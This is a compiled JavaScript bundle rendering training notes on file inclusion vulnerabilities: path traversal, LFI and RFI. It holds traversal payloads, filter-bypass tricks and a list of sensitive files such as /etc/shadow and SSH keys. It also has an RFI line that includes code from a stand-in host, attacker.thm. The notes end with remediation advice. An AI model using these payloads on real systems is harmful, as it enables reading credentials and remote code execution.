"use strict";(self.webpackChunkTHM_Notes=self.webpackChunkTHM_Notes||[]).push([[6086],{7876:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>r,metadata:()=>c,toc:()=>d});var i=t(4848),s=t(8453);const r={},l="Path Traversal (Directory traversal)",c={id:"Jr Penetration Tester/Introduction to Web Hacking/File Inclusion",title:"File Inclusion",description:"File inclusion vulnerabilities",source:"@site/docs/Jr Penetration Tester/Introduction to Web Hacking/File Inclusion.md",sourceDirName:"Jr Penetration Tester/Introduction to Web Hacking",slug:"/Jr Penetration Tester/Introduction to Web Hacking/File Inclusion",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/File Inclusion",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"THMSidebar",previous:{title:"Cross-site Scripting",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/Cross-site Scripting"},next:{title:"IDOR",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/IDOR"}},o={},d=[];function a(e){const n={code:"code",h1:"h1",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,s.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.p,{children:"#Web"}),"\n",(0,i.jsx)(n.p,{children:"File inclusion vulnerabilities"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Local File Inclusion(LFI)"}),"\n",(0,i.jsx)(n.li,{children:"Remote File Inclusion(RFI)"}),"\n",(0,i.jsx)(n.li,{children:"directory traversal"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["Query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.\n",(0,i.jsx)(n.img,{alt:"essential parts of a url",src:t(3039).A+"",width:"672",height:"324"})]}),"\n",(0,i.jsx)(n.p,{children:"The main issue of this vulnerabilities is the poor input validation. It may happens leak data and even gain remote command execution(RCE)."}),"\n",(0,i.jsx)(n.h1,{id:"path-traversal-directory-traversal",children:"Path Traversal (Directory traversal)"}),"\n",(0,i.jsx)(n.p,{children:"The attacker exploits this vulnerability by manipulating and  abusing the URL to locate and access the files and directories stored outside the application's root directory."}),"\n",(0,i.jsxs)(n.p,{children:["It occurs when the user's input passed to a function such as file_get_contents in PHP, and it have ",(0,i.jsx)(n.strong,{children:"poor input validation or filter"}),"."]}),"\n",(0,i.jsxs)(n.p,{children:["Path traversal attack(dot-dot-slash attack) using ",(0,i.jsx)(n.code,{children:"../"})," which sending to the entry point such as ",(0,i.jsx)(n.code,{children:"get.php?file="})]}),"\n",(0,i.jsx)(n.p,{children:"Some common OS files:"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{style:{textAlign:"center"},children:(0,i.jsx)(n.strong,{children:"Locations"})}),(0,i.jsx)(n.th,{style:{textAlign:"center"},children:(0,i.jsx)(n.strong,{children:"Description"})})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/etc/issue"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"contains a message or system identification to be printed before the login prompt."})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/etc/profile"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/proc/version"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"specifies the version of the Linux kernel"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/etc/passwd"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"has all registered user that has access to a system"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/etc/shadow"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"contains information about the system's users' passwords"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/root/.bash_history"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"contains the history commands for root user"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/var/log/dmessage"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"contains global system messages, including the messages that are logged during system startup"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/var/mail/root"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"all emails for root user"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/root/.ssh/id_rsa"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"Private SSH keys for a root or any known valid user on the server"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"/var/log/apache2/access.log"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"the accessed requests for Apache webserver"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"C:\\boot.ini"}),(0,i.jsx)(n.td,{style:{textAlign:"center"},children:"contains the boot options for computers with BIOS firmware"})]})]})]}),"\n",(0,i.jsx)(n.h1,{id:"local-file-inclusion-lfi",children:"Local File Inclusion (LFI)"}),"\n",(0,i.jsx)(n.p,{children:"It happened when using PHP, ASP, JSP, Node.js."}),"\n",(0,i.jsxs)(n.p,{children:["In PHP, using function such as ",(0,i.jsx)(n.code,{children:"include"}),", ",(0,i.jsx)(n.code,{children:"require"}),", ",(0,i.jsx)(n.code,{children:"include_once"}),", and ",(0,i.jsx)(n.code,{children:"require_once"})," often contribute to LFI"]}),"\n",(0,i.jsx)(n.p,{children:"Example:"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"An application provides two languages (EN and AR)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:'<?PHP \n    include($_GET["lang"]);\n?>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["The PHP above uses a ",(0,i.jsx)(n.code,{children:"GET"})," request via the URL parameter ",(0,i.jsx)(n.code,{children:"lang"})," to include the file."]}),"\n",(0,i.jsxs)(n.p,{children:["We can use ",(0,i.jsx)(n.code,{children:"http://webapp.thm/get.php?file=/etc/passwd"})," as our payload."]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"In the following code, it specify the directory inside the function"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?PHP \n\tinclude(\"languages/\". $_GET['lang']); \n?>\n"})}),"\n",(0,i.jsxs)(n.p,{children:["The PHP above use ",(0,i.jsx)(n.code,{children:"include"})," function to call PHP pages in the ",(0,i.jsx)(n.code,{children:"languages"})," directory only via ",(0,i.jsx)(n.code,{children:"lang"})," parameters."]}),"\n",(0,i.jsxs)(n.p,{children:["We can use ",(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=../../../../etc/passwd"})," as our payload."]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["(BlackBox Test), we get a entry point",(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=EN"}),", after we enter a invalid input, we get the error"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n"})}),"\n",(0,i.jsxs)(n.p,{children:["it shows what the include function like",(0,i.jsx)(n.code,{children:"include(languages/THM.php);"}),", which add ",(0,i.jsx)(n.code,{children:".php"})," at the end of entry, and it show us the full web application directory is ",(0,i.jsx)(n.code,{children:"/var/www/html/THM-4/"})]}),"\n",(0,i.jsxs)(n.p,{children:["So we use ",(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=../../../../etc/passwd"})," as payload, but it shows the code below since the ",(0,i.jsx)(n.code,{children:"include"})," function read the ",(0,i.jsx)(n.code,{children:".php"})," at the end"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Bypass it, we can use the NULL BYTE, which is ",(0,i.jsx)(n.code,{children:"%00"})," or ",(0,i.jsx)(n.code,{children:"0x00"})," in hex, it is an injection technique in URL-encoded."]}),"\n",(0,i.jsxs)(n.p,{children:["NOTE: the ",(0,i.jsx)(n.code,{children:"%00"})," trick is fixed in PHP5.3.4 and above."]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["it uses filter keywords, the ",(0,i.jsx)(n.code,{children:"/etc/passwd"})," file is being filtered, two ways to bypass it:"]}),"\n",(0,i.jsxs)(n.p,{children:["using the NullByte ",(0,i.jsx)(n.code,{children:"%00"})," or the current directory trick at the end of the keyword",(0,i.jsx)(n.code,{children:"/."})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=/etc/passwd/."})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=/etc/passwd%00"})}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"it uses input validation by filter some keywords"}),"\n",(0,i.jsxs)(n.p,{children:["we use ",(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=../../../../etc/passwd"})," as payload, and get the error below"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15\n"})}),"\n",(0,i.jsxs)(n.p,{children:["it replace ",(0,i.jsx)(n.code,{children:"../"})," to empty string, to bypass it, we can use payload ",(0,i.jsx)(n.code,{children:"....//....//....//....//....//etc/passwd"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"how the payload work",src:t(6180).A+"",width:"1095",height:"405"})}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["it forces the include to read from a defined directory, if the entry point is like ",(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=languages/EN.php"})," the payload should be ",(0,i.jsx)(n.code,{children:"?lang=languages/../../../../../etc/passwd"})]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"To pass the filter, some times we can change GET method to POST method"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h1,{id:"remote-file-inclusion-rfi",children:"Remote File Inclusion (RFI)"}),"\n",(0,i.jsxs)(n.p,{children:["It happened when the input allow attacker to inject an external URL into ",(0,i.jsx)(n.code,{children:"include"})," function, one requirement is ",(0,i.jsx)(n.code,{children:"allow_url_fopen"})," is on."]}),"\n",(0,i.jsx)(n.p,{children:"The consequence of RFI is:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Remote Command Execute (RCE)"}),"\n",(0,i.jsx)(n.li,{children:"Sensitive Information Disclose"}),"\n",(0,i.jsx)(n.li,{children:"Cross-site Scripting (XSS)"}),"\n",(0,i.jsx)(n.li,{children:"Denial of Service (DoS)"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["A external server where the attacker hosts malicious files must communicate with the application server.\n",(0,i.jsx)(n.code,{children:"http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt"})]}),"\n",(0,i.jsx)(n.h1,{id:"remediation",children:"Remediation"}),"\n",(0,i.jsx)(n.p,{children:"To prevent the file inclusion"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Keep system, services and framework update"}),"\n",(0,i.jsx)(n.li,{children:"Turn off PHP errors to avoid reveal informations"}),"\n",(0,i.jsx)(n.li,{children:"A Web Application Firewall (WAF)"}),"\n",(0,i.jsxs)(n.li,{children:["Disable some PHP features such as ",(0,i.jsx)(n.code,{children:"allow_url_fopen"})," and ",(0,i.jsx)(n.code,{children:"allow_url_input"})]}),"\n",(0,i.jsx)(n.li,{children:"Allow only protocols and PHP wrappers that are in need"}),"\n",(0,i.jsx)(n.li,{children:"Implement whitelisting for file names and locations as well as blacklisting"}),"\n"]}),"\n",(0,i.jsx)(n.h1,{id:"steps-for-testing-for-lfi",children:"Steps for testing for LFI"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Find an entry point that could be via GET, POST, COOKIE, or HTTP header values"}),"\n",(0,i.jsx)(n.li,{children:"Enter a valid input to see how the web server behaves."}),"\n",(0,i.jsx)(n.li,{children:"Enter invalid inputs, including special characters and common file names."}),"\n",(0,i.jsx)(n.li,{children:"Use either a browser address bar or a tool such as Burpsuite."}),"\n",(0,i.jsx)(n.li,{children:"Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option."}),"\n",(0,i.jsx)(n.li,{children:"Understand the input validation and if there are any filters"}),"\n",(0,i.jsx)(n.li,{children:"Try the inject a valid entry to read sensitive files"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},3039:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/File_Inclusion_1-afea25518fe47e1a13ce468174b4b6a8.png"},6180:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/File_Inclusion_2-e368ae403fce855b154d616b882f5e7c.png"},8453:(e,n,t)=>{t.d(n,{R:()=>l,x:()=>c});var i=t(6540);const s={},r=i.createContext(s);function l(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);